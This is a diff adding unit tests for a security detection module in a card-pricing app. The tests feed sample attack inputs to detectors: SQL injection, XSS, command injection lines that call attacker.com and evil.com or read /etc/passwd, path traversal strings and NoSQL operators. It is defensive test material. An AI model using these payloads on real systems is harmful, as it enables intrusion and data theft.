@@ -33,6 +33,11 @@ import { buildAlertEmailSubject, sendAlertEmail } from "../lib/data/email.js";
 import { csvEscape, csvRow } from "../lib/data/csv.js";
 import { matchesQuery, searchCards, getAllSets, getSetWithCards } from "../lib/cards/card-database.js";
 import { computePriceTrend } from "../lib/cards/price-history.js";
+import {
+  detectSqli, detectXss, detectCommandInjection,
+  detectPathTraversal, detectPrototypePollution, detectNoSqlInjection,
+  fingerprintRequest, DETECTION_RULES, resetAnomalyScores,
+} from "../lib/security/rasp.js";
 import { findCardByCardId } from "../lib/cards/card-database.js";
 
 let passed = 0;
@@ -2053,6 +2058,176 @@ test("parseSpecPopItem: handles partial data", () => {
   eq(r.pop10, 100);
   eq(r.pop9, null);
   eq(r.popTotal, 500);
+});
+
+// ── RASP detection ──
+
+console.log("\n\x1b[1m=== RASP: SQLi detection ===\x1b[0m");
+
+test("detectSqli: catches UNION SELECT", () => {
+  assert(detectSqli("' UNION SELECT * FROM users--") !== null);
+});
+test("detectSqli: catches union all select", () => {
+  assert(detectSqli("1 union all select 1,2,3") !== null);
+});
+test("detectSqli: catches stacked query", () => {
+  assert(detectSqli("'; DROP TABLE cards--") !== null);
+});
+test("detectSqli: catches tautology", () => {
+  assert(detectSqli("' OR '1'='1") !== null);
+});
+test("detectSqli: catches comment injection", () => {
+  assert(detectSqli("admin'--") !== null);
+});
+test("detectSqli: safe — normal card name", () => {
+  assert(detectSqli("Pikachu ex SAR 234/193") === null);
+});
+test("detectSqli: safe — V-UNION card name", () => {
+  assert(detectSqli("Pikachu V-UNION") === null);
+});
+test("detectSqli: safe — null input", () => {
+  assert(detectSqli(null) === null);
+});
+
+console.log("\n\x1b[1m=== RASP: XSS detection ===\x1b[0m");
+
+test("detectXss: catches script tag", () => {
+  assert(detectXss("<script>alert(1)</script>") !== null);
+});
+test("detectXss: catches javascript protocol", () => {
+  assert(detectXss("javascript:void(0)") !== null);
+});
+test("detectXss: catches onerror handler", () => {
+  assert(detectXss('<img src=x onerror=alert(1)>') !== null);
+});
+test("detectXss: catches iframe", () => {
+  assert(detectXss("<iframe src=evil.com>") !== null);
+});
+test("detectXss: catches svg onload", () => {
+  assert(detectXss('<svg/onload=alert(1)>') !== null);
+});
+test("detectXss: safe — normal HTML entity in name", () => {
+  assert(detectXss("Charizard &amp; Reshiram") === null);
+});
+test("detectXss: safe — angle brackets without payload", () => {
+  assert(detectXss("price < 100") === null);
+});
+
+console.log("\n\x1b[1m=== RASP: Command injection ===\x1b[0m");
+
+test("detectCommandInjection: catches semicolon command", () => {
+  assert(detectCommandInjection("; cat /etc/passwd") !== null);
+});
+test("detectCommandInjection: catches pipe command", () => {
+  assert(detectCommandInjection("| curl attacker.com") !== null);
+});
+test("detectCommandInjection: catches backtick execution", () => {
+  assert(detectCommandInjection("`whoami`") !== null);
+});
+test("detectCommandInjection: catches subshell", () => {
+  assert(detectCommandInjection("$(curl http://evil.com)") !== null);
+});
+test("detectCommandInjection: safe — card number with slash", () => {
+  assert(detectCommandInjection("123/456") === null);
+});
+test("detectCommandInjection: safe — normal search query", () => {
+  assert(detectCommandInjection("Umbreon ex SAR 217/187") === null);
+});
+
+console.log("\n\x1b[1m=== RASP: Path traversal ===\x1b[0m");
+
+test("detectPathTraversal: catches dot-dot-slash", () => {
+  assert(detectPathTraversal("../../etc/passwd") !== null);
+});
+test("detectPathTraversal: catches URL-encoded traversal", () => {
+  assert(detectPathTraversal("%2e%2e%2fetc/passwd") !== null);
+});
+test("detectPathTraversal: catches double-encoded", () => {
+  assert(detectPathTraversal("%252e%252e%252f") !== null);
+});
+test("detectPathTraversal: catches /proc/self", () => {
+  assert(detectPathTraversal("/proc/self/environ") !== null);
+});
+test("detectPathTraversal: safe — normal API path", () => {
+  assert(detectPathTraversal("/api/card/sv1/123") === null);
+});
+
+console.log("\n\x1b[1m=== RASP: Prototype pollution ===\x1b[0m");
+
+test("detectPrototypePollution: catches __proto__ key", () => {
+  assert(detectPrototypePollution({ __proto__: { admin: true } }) !== null);
+});
+test("detectPrototypePollution: catches nested constructor key", () => {
+  assert(detectPrototypePollution({ a: { constructor: {} } }) !== null);
+});
+test("detectPrototypePollution: catches prototype key", () => {
+  assert(detectPrototypePollution({ prototype: {} }) !== null);
+});
+test("detectPrototypePollution: safe — normal object", () => {
+  assert(detectPrototypePollution({ cardName: "Pikachu", imageUrl: "https://example.com" }) === null);
+});
+test("detectPrototypePollution: safe — null input", () => {
+  assert(detectPrototypePollution(null) === null);
+});
+
+console.log("\n\x1b[1m=== RASP: NoSQL injection ===\x1b[0m");
+
+test("detectNoSqlInjection: catches $gt operator", () => {
+  assert(detectNoSqlInjection('{"$gt": ""}') !== null);
+});
+test("detectNoSqlInjection: catches $ne operator", () => {
+  assert(detectNoSqlInjection("$ne") !== null);
+});
+test("detectNoSqlInjection: catches $regex", () => {
+  assert(detectNoSqlInjection("$regex") !== null);
+});
+test("detectNoSqlInjection: catches $where", () => {
+  assert(detectNoSqlInjection("$where") !== null);
+});
+test("detectNoSqlInjection: safe — dollar in price", () => {
+  assert(detectNoSqlInjection("$19.99") === null);
+});
+test("detectNoSqlInjection: safe — normal query", () => {
+  assert(detectNoSqlInjection("Charizard ex PSA 10") === null);
+});
+
+console.log("\n\x1b[1m=== RASP: Bot fingerprinting ===\x1b[0m");
+
+test("fingerprintRequest: flags sqlmap user-agent", () => {
+  const r = fingerprintRequest({ headers: { "user-agent": "sqlmap/1.7#stable" } });
+  assert(r.flags.includes("scanner-ua"), "should flag scanner-ua");
+  assert(r.botScore > 0, "should have positive bot score");
+});
+test("fingerprintRequest: flags missing user-agent", () => {
+  const r = fingerprintRequest({ headers: {} });
+  assert(r.flags.includes("missing-ua"));
+});
+test("fingerprintRequest: flags ZAP but lower score", () => {
+  const r = fingerprintRequest({ headers: { "user-agent": "Mozilla/5.0 (zaproxy)" } });
+  assert(r.flags.includes("zap-ua"));
+  eq(r.botScore, 5);
+});
+test("fingerprintRequest: clean browser request", () => {
+  const r = fingerprintRequest({ headers: { "user-agent": "Mozilla/5.0 Chrome/120", accept: "text/html", host: "localhost" } });
+  eq(r.flags.length, 0);
+  eq(r.botScore, 0);
+});
+
+console.log("\n\x1b[1m=== RASP: Rule structure ===\x1b[0m");
+
+test("DETECTION_RULES: non-empty array", () => {
+  assert(Array.isArray(DETECTION_RULES) && DETECTION_RULES.length > 0);
+});
+test("DETECTION_RULES: all rules have required fields", () => {
+  for (const r of DETECTION_RULES) {
+    assert(r.id && r.category && r.severity && r.pattern, `rule ${r.id} missing fields`);
+  }
+});
+test("DETECTION_RULES: covers all categories", () => {
+  const cats = new Set(DETECTION_RULES.map(r => r.category));
+  for (const c of ["sqli", "xss", "cmdi", "traversal", "nosqli"]) {
+    assert(cats.has(c), `missing category ${c}`);
+  }
 });
 
 // ── Summary ──
